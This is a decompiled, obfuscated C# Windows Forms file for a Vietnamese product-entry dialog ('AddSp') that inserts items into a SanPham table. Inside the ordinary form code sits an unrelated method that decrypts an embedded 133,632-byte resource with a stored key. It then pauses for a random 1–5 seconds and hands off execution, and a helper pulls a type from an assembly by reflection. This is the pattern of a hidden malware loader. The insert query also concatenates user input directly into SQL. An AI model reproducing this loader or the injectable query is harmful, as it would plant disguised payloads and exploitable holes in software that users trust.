using System;
using System.ComponentModel;
using System.Drawing;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using Bb9w;
using Microsoft.VisualBasic.CompilerServices;
using Pp27;
using Rx8m;
using j3WH;

namespace r9JD;

[DesignerGenerated]
public class Nt0w : Form
{
	private IContainer components;

	private Label _labbale;

	private TextBox _txtLoaisp;

	private TextBox _txtMasp;

	private TextBox _txtSoluong;

	internal Label K;

	internal Label X;

	internal TextBox R;

	internal Label S;

	internal Button N;

	internal Button U;

	internal f1T9 o;

	public Nt0w()
	{
		((Form)this).add_Load((EventHandler)w8W9);
		f1T9 f1T = (o = new f1T9());
		b0B7();
	}

	protected override void x6JX(bool f3KY)
	{
		try
		{
			if (f3KY && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(f3KY);
		}
	}

	private void b0B7()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		m9P3(new Label());
		o6LP(new Label());
		j6T9(new Label());
		a1DL(new TextBox());
		Lj0w(new TextBox());
		q8SG(new TextBox());
		Fx26(new Label());
		Lb3t(new TextBox());
		Wa78(new Button());
		Et9x(new Button());
		((Control)this).SuspendLayout();
		e8YD().set_AutoSize(true);
		((Control)e8YD()).set_Location(new Point(13, 26));
		((Control)e8YD()).set_Name("lablbla");
		((Control)e8YD()).set_Size(new Size(44, 13));
		((Control)e8YD()).set_TabIndex(0);
		e8YD().set_Text("Loai SP");
		Gz70().set_AutoSize(true);
		((Control)Gz70()).set_Location(new Point(13, 71));
		((Control)Gz70()).set_Name("labbale");
		((Control)Gz70()).set_Size(new Size(39, 13));
		((Control)Gz70()).set_TabIndex(1);
		Gz70().set_Text("Ma SP");
		p7FC().set_AutoSize(true);
		((Control)p7FC()).set_Location(new Point(13, 119));
		((Control)p7FC()).set_Name("Label3");
		((Control)p7FC()).set_Size(new Size(43, 13));
		((Control)p7FC()).set_TabIndex(2);
		p7FC().set_Text("Ten SP");
		((Control)Wc0a()).set_Location(new Point(72, 23));
		((Control)Wc0a()).set_Name("txtLoaisp");
		((TextBoxBase)Wc0a()).set_ReadOnly(true);
		((Control)Wc0a()).set_Size(new Size(179, 20));
		((Control)Wc0a()).set_TabIndex(3);
		((Control)d4WC()).set_Location(new Point(72, 68));
		((Control)d4WC()).set_Name("txtMasp");
		((Control)d4WC()).set_Size(new Size(179, 20));
		((Control)d4WC()).set_TabIndex(4);
		((Control)m2BK()).set_Location(new Point(72, 116));
		((Control)m2BK()).set_Name("txtTensp");
		((Control)m2BK()).set_Size(new Size(179, 20));
		((Control)m2BK()).set_TabIndex(5);
		f5RC().set_AutoSize(true);
		((Control)f5RC()).set_Location(new Point(13, 168));
		((Control)f5RC()).set_Name("Label4");
		((Control)f5RC()).set_Size(new Size(53, 13));
		((Control)f5RC()).set_TabIndex(6);
		f5RC().set_Text("So Luong");
		((Control)r3Y5()).set_Location(new Point(72, 168));
		((Control)r3Y5()).set_Name("txtSoluong");
		((Control)r3Y5()).set_Size(new Size(179, 20));
		((Control)r3Y5()).set_TabIndex(7);
		((Control)Gw70()).set_Location(new Point(48, 207));
		((Control)Gw70()).set_Name("btnOK");
		((Control)Gw70()).set_Size(new Size(75, 23));
		((Control)Gw70()).set_TabIndex(8);
		((ButtonBase)Gw70()).set_Text("OK");
		((ButtonBase)Gw70()).set_UseVisualStyleBackColor(true);
		((Control)Di58()).set_Location(new Point(160, 207));
		((Control)Di58()).set_Name("btnCanc");
		((Control)Di58()).set_Size(new Size(75, 23));
		((Control)Di58()).set_TabIndex(9);
		((ButtonBase)Di58()).set_Text("Cancel");
		((ButtonBase)Di58()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(284, 262));
		((Control)this).get_Controls().Add((Control)(object)Di58());
		((Control)this).get_Controls().Add((Control)(object)Gw70());
		((Control)this).get_Controls().Add((Control)(object)r3Y5());
		((Control)this).get_Controls().Add((Control)(object)f5RC());
		((Control)this).get_Controls().Add((Control)(object)m2BK());
		((Control)this).get_Controls().Add((Control)(object)d4WC());
		((Control)this).get_Controls().Add((Control)(object)Wc0a());
		((Control)this).get_Controls().Add((Control)(object)p7FC());
		((Control)this).get_Controls().Add((Control)(object)Gz70());
		((Control)this).get_Controls().Add((Control)(object)e8YD());
		((Control)this).set_Name("AddSp");
		((Form)this).set_Text("AddSp");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual Label e8YD()
	{
		return K;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void m9P3(Label Jk9z)
	{
		Label val = (K = Jk9z);
	}

	[SpecialName]
	internal virtual Label Gz70()
	{
		return _labbale;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void o6LP(Label j2YZ)
	{
		_labbale = j2YZ;
	}

	[SpecialName]
	internal virtual Label p7FC()
	{
		return X;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void j6T9(Label p4B5)
	{
		Label val = (X = p4B5);
	}

	[SpecialName]
	internal virtual TextBox Wc0a()
	{
		return _txtLoaisp;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void a1DL(TextBox Yk68)
	{
		_txtLoaisp = Yk68;
	}

	[SpecialName]
	internal virtual TextBox d4WC()
	{
		return _txtMasp;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Lj0w(TextBox q7S5)
	{
		_txtMasp = q7S5;
	}

	[SpecialName]
	internal virtual TextBox m2BK()
	{
		return R;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void q8SG(TextBox a1Q6)
	{
		TextBox val = (R = a1Q6);
	}

	[SpecialName]
	internal virtual Label f5RC()
	{
		return S;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Fx26(Label i8W7)
	{
		Label val = (S = i8W7);
	}

	[SpecialName]
	internal virtual TextBox r3Y5()
	{
		return _txtSoluong;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Lb3t(TextBox c3Z1)
	{
		_txtSoluong = c3Z1;
	}

	[SpecialName]
	internal virtual Button Gw70()
	{
		return N;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Wa78(Button Ni79)
	{
		EventHandler eventHandler = r2HA;
		Button n = N;
		if (n != null)
		{
			((Control)n).remove_Click(eventHandler);
		}
		Button val = (N = Ni79);
		n = N;
		if (n != null)
		{
			((Control)n).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Di58()
	{
		return U;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Et9x(Button Zc30)
	{
		EventHandler eventHandler = Lj07;
		Button u = U;
		if (u != null)
		{
			((Control)u).remove_Click(eventHandler);
		}
		Button val = (U = Zc30);
		u = U;
		if (u != null)
		{
			((Control)u).add_Click(eventHandler);
		}
	}

	private object j0ML()
	{
		string text = "INSERT INTO SanPham (MaSP,TenSP,SL,MaLSP)";
		text += $"VALUES ('{d4WC().get_Text()}','{m2BK().get_Text()}','{r3Y5().get_Text()}','{Wc0a().get_Text()}')";
		return o.Li4f(text);
	}

	private object Hi47()
	{
		return string.IsNullOrEmpty(d4WC().get_Text()) || string.IsNullOrEmpty(m2BK().get_Text()) || string.IsNullOrEmpty(r3Y5().get_Text()) || string.IsNullOrEmpty(Wc0a().get_Text());
	}

	private void w8W9(object sender, EventArgs e)
	{
	}

	internal static void z4P5()
	{
		byte[] array = a0M7.q5N2(133632);
		checked
		{
			int m5XA = Convert.ToInt32(RuntimeHelpers.GetObjectValue(Lp07.mDic[Lp07.sNum])) * 3;
			int num = array.Length - 1;
			for (int i = 0; i <= num; i++)
			{
				array[i] = Dt07.Az5y(array[i], (byte[])Lp07.mDic[Lp07.sArray], m5XA, i);
			}
			Lp07.mDic.Add(Lp07.mArray, array);
			Task.Delay(new Random().Next(1000, 5000)).Wait();
			f1T9.s5GQ();
		}
	}

	private void r2HA(object sender, EventArgs e)
	{
		//IL_0018: Unknown result type (might be due to invalid IL or missing references)
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		if (Conversions.ToBoolean(Hi47()))
		{
			MessageBox.Show("Chua nhap gia tri", "Error", (MessageBoxButtons)0);
			return;
		}
		if (Conversions.ToBoolean(j0ML()))
		{
			MessageBox.Show("Them thanh cong", "Success", (MessageBoxButtons)0);
			((Form)this).set_DialogResult((DialogResult)1);
		}
		else
		{
			MessageBox.Show("Them that bai", "Error", (MessageBoxButtons)0);
			((Form)this).set_DialogResult((DialogResult)7);
		}
		((Form)this).Close();
	}

	internal static Type k3CT(Assembly Sc75)
	{
		return Sc75.GetExportedTypes()[27];
	}

	private void Lj07(object sender, EventArgs e)
	{
		((Form)this).Close();
	}
}
